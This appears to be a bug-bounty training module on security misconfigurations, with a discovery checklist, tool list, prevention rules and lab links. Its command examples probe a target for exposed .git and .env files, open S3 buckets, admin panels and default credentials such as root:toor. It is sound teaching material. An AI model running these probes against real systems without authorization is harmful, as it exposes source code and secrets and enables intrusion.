# ⚠️ Module 11: Security Misconfigurations

> **Level:** 🔴 Advanced | **Time:** ~3 hours | **Prerequisites:** Module 01-10

---

## 📖 Overview

Security misconfigurations are the #1 most common finding in bug bounty and penetration testing. They occur when security settings are not properly defined, implemented, or maintained. These range from default credentials and exposed admin panels to directory listing and overly permissive cloud storage.

---

## ❓ Why It Matters

Misconfigurations are often the easiest bugs to find and still carry significant impact. A single exposed `.git` directory can leak entire source code. An open S3 bucket can expose millions of user records. These bugs are consistently rewarded at **$500 to $15,000+** depending on impact.

---

## 🌍 Real-World Example

A researcher discovered that a Fortune 100 company had an exposed `.git` directory on their main website. Using `git-dumper`, they extracted the entire source code repository, which contained database credentials, API keys, and internal infrastructure details. This critical finding earned a **$25,000 bounty**.

---

## 📋 Step-by-Step Methodology

### Misconfiguration Discovery Checklist

```
□ Default credentials (admin/admin, admin/password)
□ Exposed admin panels (/admin, /administrator, /wp-admin)
□ Directory listing enabled
□ Exposed .git, .svn, .env directories
□ Verbose error messages (stack traces, DB errors)
□ Open cloud storage (S3, Azure Blob, GCS)
□ Exposed API documentation (/swagger, /api-docs)
□ Unnecessary services and ports open
□ Outdated software with known CVEs
□ Missing security headers
□ Debug mode enabled in production
□ Exposed backup files (.bak, .old, .backup)
```

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| **nikto** | Web server misconfiguration scanner |
| **nuclei** | Template-based vulnerability scanner |
| **git-dumper** | Extract exposed .git directories |
| **truffleHog** | Find secrets in code |
| **dirsearch** | Directory/file scanner |
| **shodan** | Find misconfigured internet services |
| **s3scanner** | Find open S3 buckets |

---

## 💡 Payload Examples

### Exposed .git Directory

```bash
# Check for exposed .git
curl https://target.com/.git/HEAD
# If responds with: ref: refs/heads/master
# The .git directory is exposed!

# Extract source code with git-dumper
pip install git-dumper
git-dumper https://target.com/.git/ ./extracted_repo

# Or manually:
curl https://target.com/.git/config
curl https://target.com/.git/COMMIT_EDITMSG
curl https://target.com/.git/refs/heads/master
```

### Exposed .env Files

```bash
# Check for common secret files
curl https://target.com/.env
curl https://target.com/.env.local
curl https://target.com/.env.production
curl https://target.com/config.php
curl https://target.com/config.js
curl https://target.com/database.yml
curl https://target.com/wp-config.php

# Automate with ffuf
ffuf -u https://target.com/FUZZ \
    -w /opt/SecLists/Discovery/Web-Content/quickhits.txt \
    -mc 200
```

### Open Cloud Storage

```bash
# AWS S3 buckets
# Naming patterns: target-backup, target-assets, target-logs, target-dev
aws s3 ls s3://target-backup --no-sign-request
aws s3 ls s3://target-assets --no-sign-request

# S3Scanner
python3 s3scanner.py --buckets target-backup,target-assets,target-data

# Google Cloud Storage
gsutil ls gs://target-backup

# Azure Blob Storage
az storage blob list --account-name targetstorage --container-name public
```

### Default Credentials Testing

```bash
# Common default credentials to test:
admin:admin
admin:password
admin:123456
admin:admin123
root:root
root:toor
administrator:administrator
test:test
guest:guest

# Service-specific defaults
# Apache Tomcat: tomcat/tomcat
# Jenkins: admin/password (or no password)
# Grafana: admin/admin
# phpMyAdmin: root/(empty)
# MongoDB: (no auth by default if misconfigured)
# Redis: (no auth by default if misconfigured)
```

### Directory Listing

```bash
# Test for directory listing
curl https://target.com/images/
curl https://target.com/uploads/
curl https://target.com/backup/

# If response contains "Index of /" — directory listing is enabled!
# Look for interesting files in listed directories
```

### Exposed Admin Panels

```bash
# Common admin paths
/admin
/admin/login
/administrator
/wp-admin
/wp-login.php
/phpmyadmin
/pma
/manager
/manager/html          # Tomcat manager
/jenkins
/grafana
/kibana
/_admin
/admin.php
/adminpanel
/cpanel
/plesk
/webmin

# Use ffuf with admin wordlist
ffuf -u https://target.com/FUZZ \
    -w /opt/SecLists/Discovery/Web-Content/admin-panels.txt \
    -mc 200,301,302,403
```

### nuclei Scanning

```bash
# Scan for misconfigurations
nuclei -u https://target.com -t ~/nuclei-templates/misconfiguration/

# Scan for exposed files
nuclei -u https://target.com -t ~/nuclei-templates/exposures/

# Scan for default credentials
nuclei -u https://target.com -t ~/nuclei-templates/default-logins/

# Full scan
nuclei -u https://target.com -severity medium,high,critical
```

---

## 🛡️ Prevention

| Issue | Prevention |
|-------|-----------|
| Default credentials | Change all defaults immediately after installation |
| Exposed admin panels | Restrict to internal IP, require VPN |
| Directory listing | Disable in web server config: `Options -Indexes` |
| Exposed .git | Block .git with `.htaccess` or nginx rule |
| Exposed .env | Never put secrets in web root |
| Open S3 buckets | Set bucket policies to deny public access |
| Debug mode | Always set `DEBUG=False` in production |

```nginx
# Nginx: Block sensitive files
location ~ /\. {
    deny all;
    access_log off;
    log_not_found off;
}

location ~* \.(git|env|sql|bak|backup|old)$ {
    deny all;
}
```

---

## 🧪 Practice Labs

| Lab | Link | Exercise |
|-----|------|---------|
| TryHackMe | [tryhackme.com](https://tryhackme.com) | OWASP Top 10 room |
| HackTheBox | [hackthebox.com](https://hackthebox.com) | Misconfiguration machines |
| PortSwigger | [portswigger.net](https://portswigger.net/web-security/information-disclosure) | Information disclosure labs |
| DVWA | localhost | Various modules |

---

<div align="center">

[← Module 10: Brute Forcing](../10.%20Brute%20Forcing/README.md) | [Next Module: Insecure CORS →](../12.%20Insecure%20CORS/README.md)

</div>
